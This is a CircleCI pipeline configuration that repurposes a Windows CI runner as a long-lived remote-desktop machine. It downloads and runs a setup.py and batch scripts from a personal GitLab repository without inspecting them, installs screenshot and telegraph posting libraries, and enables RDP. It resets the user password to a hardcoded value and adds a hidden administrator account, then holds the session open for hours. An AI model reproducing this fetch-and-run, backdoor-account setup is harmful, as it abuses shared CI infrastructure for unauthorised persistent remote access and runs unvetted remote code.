version: 2.1
orbs:
  win: circleci/windows@5.0

jobs:
  build:
    executor:
      name: win/default
      size: medium

    steps:
      - run:
          name: Prepare, launch Avica UI, run setup.py (stable)
          shell: powershell.exe
          no_output_timeout: 30m
          command: |
            $ErrorActionPreference = 'Stop'
            try { chcp 65001 | Out-Null } catch {}
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

            function Get-File($u,$o){
              Write-Host "Downloading $o ..."
              Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing
              $s=(Get-Item $o).Length
              Write-Host "OK $o ($s bytes)"
            }

            Write-Host "=== Download artifacts ==="
            Get-File "https://gitlab.com/userup908/my-rdp/-/raw/main/setup.py" "setup.py"
            Get-File "https://download.avica.com/AvicaLite_v8.0.8.9.exe" "Avica_setup.exe"
            Get-File "https://gitlab.com/userup908/my-rdp/-/raw/main/show.bat" "show.bat"
            Get-File "https://gitlab.com/userup908/my-rdp/-/raw/main/loop.bat" "loop.bat"

            Write-Host "`n=== Python locate & pip (one shot) ==="
            $py = (Get-Command python -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source)
            if (-not $py) { $py = (Get-Command py -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source) }
            if (-not $py) { throw "Python not found in PATH" }
            & $py --version
            & $py -m pip install --quiet --disable-pip-version-check --upgrade-strategy only-if-needed --no-cache-dir requests Pillow pyautogui telegraph
            Write-Host "pip installs done."

            Write-Host "`n=== Enable RDP & user ==="
            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
            Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
            $u=$env:USERNAME
            net user $u TheDisa1a 2>$null
            net user runneradmin TheDisa1a /add 2>$null
            if ($LASTEXITCODE -eq 0) { net localgroup administrators runneradmin /add 2>$null }

            Write-Host "`n=== Minimize console & LAUNCH Avica installer (UI mode) ==="
            try {
              # Small YAML-safe Add-Type (no here-string)
              $cs = @(
                'using System;'
                'using System.Runtime.InteropServices;'
                'public static class W32 {'
                '  [DllImport(""' + 'user32.dll' + '"")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
                '}'
              ) -join "`n"
              Add-Type -TypeDefinition $cs
              $hwnd = (Get-Process -Id $PID).MainWindowHandle
              [W32]::ShowWindow($hwnd,6) | Out-Null   # 6 = Minimize
            } catch {}

            $av = Join-Path (Get-Location) "Avica_setup.exe"
            Write-Host "Starting Avica installer (no silent flags): $av"
            # UI mode; DO NOT wait so pipeline stays fast
            Start-Process -FilePath $av -WindowStyle Normal
            Start-Sleep -Seconds 5  # give UI a moment; setup.py still has its own wait

            Write-Host "`n=== Run setup.py (capture output, don't fail on nonzero) ==="
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $py
            $psi.Arguments = '"setup.py"'
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError  = $true
            $psi.UseShellExecute        = $false
            $psi.CreateNoWindow         = $true
            $proc = [System.Diagnostics.Process]::Start($psi)
            $proc.WaitForExit()

            # Print combined logs but downgrade the known noisy line
            $stdout = $proc.StandardOutput.ReadToEnd()
            $stderr = $proc.StandardError.ReadToEnd()
            ($stdout + $stderr).Split("`n") | ForEach-Object {
              if ($_ -match "^\s*'C:\\Program.*is not recognized") {
                Write-Host "[note] Unquoted path from child process (non-fatal): $_" -ForegroundColor DarkYellow
              } elseif ($_ -ne '') {
                Write-Host "  $_"
              }
            }
            Write-Host "setup.py exit code: $($proc.ExitCode)"
            if ($proc.ExitCode -ne 0) {
              Write-Host "WARNING: setup.py returned non-zero; continuing (treating as warning)" -ForegroundColor Yellow
            }

      - run:
          name: Start Services and Keep Active
          shell: cmd.exe
          no_output_timeout: 6h
          command: |
            echo Starting helper scripts...
            if exist show.bat (
                echo Found show.bat, executing...
                call show.bat
            ) else (
                echo show.bat not found!
            )
            echo Keeping session alive...
            if exist loop.bat (
                call loop.bat
            ) else (
                echo loop.bat not found, using fallback loop...
                :loop
                timeout /t 300 /nobreak >nul 2>&1
                echo Still running... %time%
                goto loop
            )

workflows:
  version: 2
  rdp-workflow:
    jobs:
      - build
